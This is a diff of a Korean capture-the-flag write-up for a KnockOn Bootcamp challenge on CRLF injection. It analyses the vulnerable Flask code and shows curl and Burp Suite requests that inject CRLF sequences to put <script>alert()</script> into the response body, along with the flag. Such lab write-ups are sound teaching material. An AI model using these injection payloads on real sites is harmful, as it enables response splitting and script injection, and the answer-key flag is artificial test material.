@@ -1,51 +1,29 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 11. CRLF injection"
+title: "KnockOn Bootcamp 2nd - 11. CRLF Injection"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
-  - Carriage Return Line Feed
+  - KnockOn Bootcamp 2nd
   - CRLF Injection
-last_modified_at: 2024-09-15T21:30:00-05:00
+last_modified_at: 2024-09-16T11:30:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10013/>
 
-![11. CRLF injection 1](/assets/images/writeup/web-hacking/knock-on/11_CRLF_1.png)
+![11. CRLF injection 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-11-crlf-1.png)
 
-![11. CRLF injection 2](/assets/images/writeup/web-hacking/knock-on/11_CRLF_2.png)
-
-|
-
-|
-
-|
+![11. CRLF injection 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-11-crlf-2.png)
 
 ### 목표
 
----
-
 CRLF Injection 실습. flag 얻기
-
-|
 
 ### 공격 기법
 
----
-
 CRLF Injection
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -76,7 +54,6 @@ def check_for_alert_function_in_url(url,data):
     else:
         print("err",sys.stderr)
         return False
-    
 
 @app.route('/report', methods=['GET','POST'])
 def report():
@@ -111,17 +88,9 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0',port=80)
 ```
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ### check_for_alert_function_in_url()
-
----
 
 ```python
 def check_for_alert_function_in_url(url,data):
@@ -147,8 +116,6 @@ def check_for_alert_function_in_url(url,data):
 
 `url`, `data`를 받아서 POST 요청을 보냄
 
-|
-
 ```python
 if response.status_code == 200:
     html_content = response.text # 1
@@ -161,19 +128,13 @@ if response.status_code == 200:
     return False
 ```
 
-200 OK 일 때, 
+200 OK 일 때,
 
 1. `response.text`(응답 본문의 텍스트 내용)을  `html_content` 에 저장
 2. `html.parser`를 이용해 `html_content`를 파싱하여 `<script>`태그를 찾아 `script_tags`에 저장
-3. `<script>`태그에 `alert(`가 포함되어있는지 확인 후 있으면 `True`, 없으면 `False` 반환 
-
-|
-
-|
+3. `<script>`태그에 `alert(`가 포함되어있는지 확인 후 있으면 `True`, 없으면 `False` 반환
 
 ### index()
-
----
 
 ```python
 def index():
@@ -201,8 +162,6 @@ POST 요청이 들어오면 실행
 
 폼 데이터에서 `header`, `value`를 가져와서 `header`, `user_input`에 각각 저장
 
-|
-
 ```python
 response = make_response(f'I\'t is very good day to walk out. Power thourgh!!!!')
 response.headers.set(header, user_input)
@@ -215,13 +174,7 @@ return response
 
 `response`반환
 
-|
-
-|
-
 ### report()
-
----
 
 ```python
 def report():
@@ -248,8 +201,6 @@ POST 요청이 들어오면 실행
 
 폼 데이터에서 `header`, `value`를 가져와서 `header`, `user_input`에 각각 저장
 
-|
-
 ```python
 if check_for_alert_function_in_url("http://localhost",{"header":header,"value":user_input}):
     response = make_response(f'{secret_flag}')
@@ -261,20 +212,12 @@ return make_response(f'Nice try!')
 
 `True`이면 `response`에 `secret_flag`저장 후 반환
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 `secret_flag`를 얻는 법
 
 1. `/report`로 POST 요청을 보내면서, `header`와 `value` 폼 데이터를 넘기기
 2. `value`에`<script>alert()</script>`를 포함시키고, 본문으로 인식시키기
-
-|
 
 ```python
 response.headers.set(header, user_input)
@@ -284,15 +227,9 @@ response.headers.set(header, user_input)
 
 잘 포함되었다면 `/report`로 같은 요청을 보내면 됨
 
-|
-
-|
-
 ## 방법 1 - curl
 
 ### curl -option
-
----
 
 `-X`: `Request Command`. HTTP 메서드를 명시적으로 요청. GET, POST 등의 요청을 할 수 있음
 
@@ -300,11 +237,7 @@ response.headers.set(header, user_input)
 
 `-v` or `--verbose`: 요청과 응답의 세부 사항을 출력. 응답 헤더가 어떻게 설정되었는지 볼 수 있음
 
-|
-
 ### 1-1. post 요청 - header, value
-
----
 
 ```bash
 curl -v http://war.knock-on.org:10013/ -d "header=header1&value=value1"
@@ -337,13 +270,7 @@ I't is very good day to walk out. Power thourgh!!!!
 
 `header`와 `value`폼 데이터를 포함시켜 `POST` 요청
 
-|
-
-|
-
 ### 1-2. 헤더를 본문으로 인식
-
----
 
 ```bash
 curl -v http://war.knock-on.org:10013/ -d "header=header1:value1%0D%0A%0D%0Aheader2&value=value2"
@@ -388,11 +315,7 @@ I't is very g
 
 `value1`, `header1`, `value2`는 없어도 됨
 
-|
-
 ### 1-3. 본문에 내용 추가
-
----
 
 ```bash
 curl -v http://war.knock-on.org:10013/ -d "header=header1:value1%0D%0A%0D%0A<script>alert()</script>header2&value=value2"
@@ -428,11 +351,7 @@ CRLF를 두 번 추가한 부분부터는 본문으로 인식됨
 
 본문에 `<script>alert()</script>`삽입
 
-|
-
 ### 1-4. /report에 요청
-
----
 
 ```bash
 curl -v http://war.knock-on.org:10013/report -d "header=header1:value1%0D%0A%0D%0A<script>alert()</script>header2&value=value2"
@@ -464,15 +383,11 @@ K0{CRLF_is_very_common_vulnerability}
 
 `/`경로에서 잘 되는 것을 확인했으니 그대로 `/report` 경로로 요청
 
-|
-
 ```bash
 curl -v http://war.knock-on.org:10013/report -d "header=%0d%0a%0D%0A<script>alert()</script>&value"
 ```
 
 코드 다이어트하면 이렇게 됨
-
-|
 
 ```bash
 curl -v http://war.knock-on.org:10013/report -d "header=%0d%0a%0D%0A&value=<script>alert()</script>"
@@ -480,17 +395,9 @@ curl -v http://war.knock-on.org:10013/report -d "header=%0d%0a%0D%0A&value=<scri
 
 보기 흉하면 value에 본문을 넣어도 됨
 
-|
-
-|
-
-|
-
 ### 방법 2 - burp suite
 
 ### 2-1. post 요청 - header, value
-
----
 
 ```sh
 POST / HTTP/1.1
@@ -514,11 +421,7 @@ I't is very good day to walk out. Power thourgh!!!!
 
 `POST` 요청으로 `header`와 `value` 설정
 
-|
-
 ### 2-2. 헤더의 value를 본문으로 인식
-
----
 
 ```sh
 POST / HTTP/1.1
@@ -546,11 +449,7 @@ I't is very good day to walk out. Power thourgh!!!!
 
 `CRLF`를 추가하여 헤더의 value를 본문으로 인식시킴
 
-|
-
 ### 2-3. 본문에 내용 추가
-
----
 
 ```sh
 POST / HTTP/1.1
@@ -580,8 +479,6 @@ I't is very good day to walk out. Power thourgh!!!!
 
 `\r\n\r\n` 과 두 번째 헤더 사이에 본문에 추가할 내용 추가
 
-|
-
 ### 2-4. /report에 요청
 
 ----
@@ -610,8 +507,6 @@ K0{CRLF_is_very_common_vulnerability}
 
 그대로 경로만 `/report`로 바꿔줌
 
-|
-
 ```bash
 POST /report HTTP/1.1
 Host: war.knock-on.org:10013
@@ -625,8 +520,6 @@ header=
 
 코드 다이어트
 
-|
-
 ```bash
 POST / HTTP/1.1
 Host: war.knock-on.org:10013
@@ -639,17 +532,9 @@ header=
 
 어차피 `\r\n\r\n` 뒤는 본문으로 인식하기 때문에 `value`의 값으로 본문을 넣어도 됨
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ### 1. curl
-
----
 
 ```bash
 curl -v http://war.knock-on.org:10013/report -d "header=%0d%0a%0D%0A<script>alert()</script>&value"
@@ -661,11 +546,7 @@ curl -v http://war.knock-on.org:10013/report -d "header=%0d%0a%0D%0A<script>aler
 curl -v http://war.knock-on.org:10013/report -d "header=%0d%0a%0D%0A&value=<script>alert()</script>"
 ```
 
-|
-
 ### 2. burp suite
-
----
 
 ```bash
 POST /report HTTP/1.1
@@ -691,18 +572,8 @@ header=
 &value=<script>alert()</script>
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```bash
 K0{CRLF_is_very_common_vulnerability}
 ```
-
-|
-
----
